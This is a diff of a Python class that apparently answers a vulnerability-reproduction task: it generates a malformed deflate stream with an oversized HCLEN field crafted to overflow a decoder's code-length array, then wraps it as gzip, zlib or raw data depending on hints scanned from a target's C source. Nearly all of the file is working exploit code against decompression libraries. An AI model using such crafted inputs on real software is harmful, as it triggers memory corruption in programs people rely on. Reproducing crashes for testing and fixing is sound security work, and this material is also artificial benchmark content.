@@ -1,158 +1,132 @@
+import os
+import re
 import tarfile
 from typing import Optional
 
 
-class _BitWriter:
-    __slots__ = ("buf", "bitpos")
-
-    def __init__(self) -> None:
-        self.buf = bytearray()
-        self.bitpos = 0  # next bit position in current byte [0..7]
-
-    def write(self, value: int, nbits: int) -> None:
-        for i in range(nbits):
-            if self.bitpos == 0:
-                self.buf.append(0)
-            if (value >> i) & 1:
-                self.buf[-1] |= (1 << self.bitpos)
-            self.bitpos = (self.bitpos + 1) & 7
-
-    def finish(self) -> bytes:
-        return bytes(self.buf)
-
-
 class Solution:
-    def _build_deflate_dynamic_empty_trigger(self) -> bytes:
-        # Dynamic Huffman block:
-        # - BFINAL=1, BTYPE=10
-        # - HLIT=0 (257 lit/len codes)
-        # - HDIST=0 (1 dist code)
-        # - HCLEN=14 (18 code-length codes) -> overflows temp arrays sized 15
-        # Code-length alphabet lengths: only symbols 1 and 18 have length 1; others 0.
-        # Then encode 258 code lengths:
-        #   256 zeros via 18(138) + 18(118)
-        #   then two 1s (litlen[256]=1, dist[0]=1)
-        # Data: EOB only.
+    def _bitpack_lsb(self, items):
+        out = bytearray()
+        acc = 0
+        bitpos = 0
+        for val, nbits in items:
+            for i in range(nbits):
+                acc |= ((val >> i) & 1) << bitpos
+                bitpos += 1
+                if bitpos == 8:
+                    out.append(acc & 0xFF)
+                    acc = 0
+                    bitpos = 0
+        if bitpos:
+            out.append(acc & 0xFF)
+        return bytes(out)
 
-        w = _BitWriter()
-        w.write(1, 1)   # BFINAL
-        w.write(2, 2)   # BTYPE=2 (dynamic)
-        w.write(0, 5)   # HLIT
-        w.write(0, 5)   # HDIST
-        w.write(14, 4)  # HCLEN (18-4)
+    def _make_deflate_payload(self) -> bytes:
+        # Dynamic Huffman, crafted to overflow code-length array (expects 15 but reads 16)
+        # BFINAL=1, BTYPE=2 (dynamic), HLIT=0, HDIST=0, HCLEN=12 => (HCLEN+4)=16
+        # Provide 16 code-length-code lengths; set only symbols 18 and 0 to length 1, others 0.
+        # Order for first 16: [16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2]
+        clen_vals = [0, 0, 1, 1] + [0] * 12  # 16 values
+        items = [
+            (1, 1),   # BFINAL
+            (2, 2),   # BTYPE=2
+            (0, 5),   # HLIT
+            (0, 5),   # HDIST
+            (12, 4),  # HCLEN
+        ]
+        for v in clen_vals:
+            items.append((v, 3))
+        payload = self._bitpack_lsb(items)
+        if len(payload) < 9:
+            payload += b"\x00" * (9 - len(payload))
+        return payload[:9]
 
-        # Code length code order (first 18 to include symbol 1; omit trailing 15)
-        order = [16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1]
-        lengths = {1: 1, 18: 1}
-        for sym in order:
-            w.write(lengths.get(sym, 0), 3)
+    def _wrap_gzip(self, deflate_payload: bytes) -> bytes:
+        header = bytes([0x1F, 0x8B, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF])
+        trailer = b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00"
+        return header + deflate_payload + trailer
 
-        # With lengths {1:1, 18:1}, canonical codes (len=1):
-        # symbol 1 -> 0, symbol 18 -> 1 (bit order irrelevant for 1 bit)
-        def cl_code_bit(sym: int) -> int:
-            return 0 if sym == 1 else 1  # only sym 1 and 18 used
+    def _wrap_zlib(self, deflate_payload: bytes) -> bytes:
+        # zlib header: 0x78 0x9C (check bits OK, no preset dict)
+        # Adler32 for empty output: 0x00000001
+        return b"\x78\x9C" + deflate_payload + b"\x00\x00\x00\x01"
 
-        # 18: repeat 0 for 138 => extra = 127 (7 bits)
-        w.write(cl_code_bit(18), 1)
-        w.write(127, 7)
-
-        # 18: repeat 0 for 118 => extra = 107 (7 bits)
-        w.write(cl_code_bit(18), 1)
-        w.write(107, 7)
-
-        # two literal lengths of 1
-        w.write(cl_code_bit(1), 1)
-        w.write(cl_code_bit(1), 1)
-
-        # Compressed data: EOB. Literal/length tree has single symbol 256 with code 0 (1 bit).
-        w.write(0, 1)
-
-        return w.finish()
-
-    def _detect_container(self, src_path: str) -> str:
-        score_gzip = 0
-        score_zlib = 0
-        score_raw = 0
-
-        def add_scores(name_l: str, data_l: bytes) -> None:
-            nonlocal score_gzip, score_zlib, score_raw
-
-            if "gzip" in name_l or "gunzip" in name_l or name_l.endswith(".gz"):
-                score_gzip += 5
-            if "zlib" in name_l or "adler" in name_l:
-                score_zlib += 5
-            if "deflate" in name_l or "inflate" in name_l:
-                score_raw += 1
-
-            if b"gzip" in data_l or b"gunzip" in data_l or b"gzopen" in data_l or b"gzread" in data_l:
-                score_gzip += 4
-            if b"adler" in data_l or b"zlib" in data_l or b"rfc1950" in data_l:
-                score_zlib += 4
-
-            # Heuristics: explicit gzip magic checks are strong indicators
-            if b"0x1f" in data_l and b"0x8b" in data_l:
-                score_gzip += 6
-            if b"1f8b" in data_l or b"1f 8b" in data_l:
-                score_gzip += 3
-            if b"id1" in data_l and b"id2" in data_l and b"mtime" in data_l and b"xfl" in data_l:
-                score_gzip += 6
-
-            # Heuristics: zlib header checks
-            if b"cmf" in data_l and b"flg" in data_l:
-                score_zlib += 4
-            if b"fdict" in data_l or b"31" in data_l and b"% 31" in data_l:
-                score_zlib += 2
-            if b"0x78" in data_l and (b"cmf" in data_l or b"flg" in data_l):
-                score_zlib += 3
-
-            # If there's evidence of expecting raw deflate (no wrapper)
-            if b"raw deflate" in data_l or b"raw inflate" in data_l:
-                score_raw += 10
-
+    def _scan_text(self, data: bytes) -> str:
         try:
-            with tarfile.open(src_path, "r:*") as tf:
-                total_read = 0
-                for m in tf:
-                    if not m.isfile():
-                        continue
-                    name_l = (m.name or "").lower()
-                    if not any(name_l.endswith(ext) for ext in (".c", ".h", ".cc", ".cpp", ".inc", ".txt", "makefile")):
-                        continue
-                    if m.size <= 0:
-                        continue
-                    f = tf.extractfile(m)
-                    if f is None:
-                        continue
-                    chunk = f.read(200_000)
-                    total_read += len(chunk)
-                    data_l = chunk.lower()
-                    add_scores(name_l, data_l)
-                    if total_read > 5_000_000:
-                        break
+            return data.decode("utf-8", "ignore").lower()
+        except Exception:
+            return ""
+
+    def _detect_format(self, src_path: str) -> str:
+        # Heuristic detection based on source contents.
+        # Defaults to gzip (project name suggests gzip).
+        text_blobs = []
+        try:
+            if os.path.isdir(src_path):
+                for root, _, files in os.walk(src_path):
+                    for fn in files:
+                        if not fn.lower().endswith((".c", ".h", ".cc", ".cpp", ".hpp")):
+                            continue
+                        p = os.path.join(root, fn)
+                        try:
+                            if os.path.getsize(p) > 2_000_000:
+                                continue
+                            with open(p, "rb") as f:
+                                text_blobs.append(self._scan_text(f.read()))
+                        except Exception:
+                            continue
+            else:
+                with tarfile.open(src_path, "r:*") as tf:
+                    for m in tf.getmembers():
+                        if not m.isfile():
+                            continue
+                        name = (m.name or "").lower()
+                        if not name.endswith((".c", ".h", ".cc", ".cpp", ".hpp")):
+                            continue
+                        if m.size > 2_000_000:
+                            continue
+                        try:
+                            f = tf.extractfile(m)
+                            if not f:
+                                continue
+                            text_blobs.append(self._scan_text(f.read()))
+                        except Exception:
+                            continue
         except Exception:
             return "gzip"
 
-        # Prefer explicit wrapper checks; default to gzip if ambiguous
-        if score_gzip >= max(score_zlib, score_raw) and score_gzip > 0:
+        all_text = "\n".join(text_blobs)
+        if not all_text:
             return "gzip"
-        if score_zlib >= score_raw and score_zlib > 0:
+
+        if "png" in all_text and "ihdr" in all_text and "idat" in all_text:
+            # If it looks like PNG-only code, it's likely zlib/deflate; but still return zlib.
             return "zlib"
-        if score_raw > 0:
+
+        if "gzip" in all_text or "gunzip" in all_text:
+            return "gzip"
+
+        # Look for gzip magic checks: 0x1f 0x8b close by
+        if re.search(r"0x1f.{0,40}0x8b|0x8b.{0,40}0x1f", all_text):
+            return "gzip"
+
+        if "adler32" in all_text or "adler" in all_text:
+            return "zlib"
+
+        if re.search(r"\bcmf\b|\bflg\b", all_text) and ("0x78" in all_text or "zlib" in all_text):
+            return "zlib"
+
+        # If explicit raw deflate/inflate without wrapper is suggested
+        if "raw deflate" in all_text or "btype" in all_text or "hlit" in all_text:
             return "raw"
+
         return "gzip"
 
     def solve(self, src_path: str) -> bytes:
-        container = self._detect_container(src_path)
-        deflate = self._build_deflate_dynamic_empty_trigger()
-
-        if container == "raw":
-            return deflate
-
-        if container == "zlib":
-            # zlib header (CMF/FLG) + deflate + Adler32(empty)=1
-            return b"\x78\x9c" + deflate + b"\x00\x00\x00\x01"
-
-        # gzip header + deflate + CRC32(empty)=0 + ISIZE=0
-        gzip_header = b"\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff"
-        gzip_footer = b"\x00\x00\x00\x00\x00\x00\x00\x00"
-        return gzip_header + deflate + gzip_footer
+        deflate_payload = self._make_deflate_payload()
+        fmt = self._detect_format(src_path)
+        if fmt == "zlib":
+            return self._wrap_zlib(deflate_payload)
+        if fmt == "raw":
+            return deflate_payload
+        return self._wrap_gzip(deflate_payload)
